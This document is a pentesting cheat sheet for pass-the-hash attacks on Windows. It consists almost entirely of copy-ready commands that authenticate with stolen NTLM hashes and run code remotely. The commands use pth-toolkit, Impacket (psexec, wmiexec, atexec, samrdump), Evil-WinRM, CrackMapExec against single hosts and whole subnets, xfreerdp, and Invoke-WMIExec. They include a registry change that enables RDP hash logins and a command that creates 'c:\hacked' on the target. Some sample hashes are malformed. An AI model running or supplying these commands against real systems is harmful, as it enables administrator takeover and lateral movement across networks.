# Pass-The-Hash

## Pass-the-Hash

It uses **NTLM Authentication**.

**Important**:

* Requires user/service account to have local admin rights on target, as connection is made using the `Admin$` share through SMB.
* Requires SMB connection through the firewall.
* Requires Windows File and Print Sharing feature to be enabled.

```bash
# Method 1
$ pth-winexe -U [domain]/[username]%[blank_hash]:[ntlm_hash] //[target] [command_to_exec]
$ pth-winexe -U xor/Administrator%aad3b435b51404eeaad3b435b51404ee:08df31234567890bf6 //10.1.1.1 cmd.exe
^OR try without domain prefix in -U flag

# Method 2
$ python wmiexec.py Administrator@[target] -hashes [LM]:[NT/NTLM]
$ python wmiexec.py Administrator@10.11.1.22 -hashes [leavebankifnoLM]:ee12345067801f38115019ca2fb

# Method 3
$ python psexec.py [username]@[target] -hashes :[NT/NTLM]

# Method 4 - RDP PTH
$ xfreerdp /u:Administrator /pth:[NTLM hash] /d:[domain] /v:[target]
^If error occurs "Account Restrictions are preventing this user from signing in.” enable Restricted Admin Mode:
$ crackmapexec smb [target] -u [username] -H [hash] -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'

# Method 5 - see guide https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/
$ crackmapexec smb [target] -u [username] -H [hash] -x "whoami" 
```

## PTH Tools

### pth-smbclient

```
pth-smbclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105/c$
```

### pth-wmic

```
pth-wmic -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105 "select Name from Win32_UserAccount"
```

### pth-rpcclient

```
pth-rpcclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105
```

### pth-net

```
pth-net rpc share list -U 'ignite\Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38' -S 192.168.1.105
```

### pth-winexe

```
pth-winexe -U Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105 cmd.exe
```

### pth-curl

```
pth-curl --ntlm -u Administrator:32196B56FFE6F45E294117B91A83BF38 http://192.168.1.105/file.txt
```

## Impacket

### smbclient

We can use smbclient:

```
impacket-smbclient.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
python smbclient.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
```

### psexec

```
impacket-psexec.py  -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
python psexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
```

### wmiexec

```
impacket-wmiexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
python wmiexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
```

### rpcdump

```
impacket-rpcdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
python rpcdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
```

### atexec

```
impacket-atexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105 whoami
python atexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105 whoami
```

### lookupsid

```
impacket-lookupsid.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
python lookupsid.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
```

### samrdump

```
impacket-samrdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
python samrdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
```

### reg

```
python reg.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
```

\
Evil-WinRM
----------

Evil-WinRM Pass The Hash:

```bash
evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d3372a07ceea6'
```

## Crackmapexec

Pass The Hash against the target:

```bash
cme smb 172.16.157.25 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51' --local-auth
```

Pass The Hash against subnet:

```bash
cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51' --local-auth
```

## PowerShell

### Invoke-WMIExec.ps1

```
Invoke-WMIExec -Target 192.168.1.105 -Domain ignite -Username Administrator -Hash 32196B56FFE6F45E294117B91A83BF38 -Command "cmd /c mkdir c:\hacked" -Verbose
```

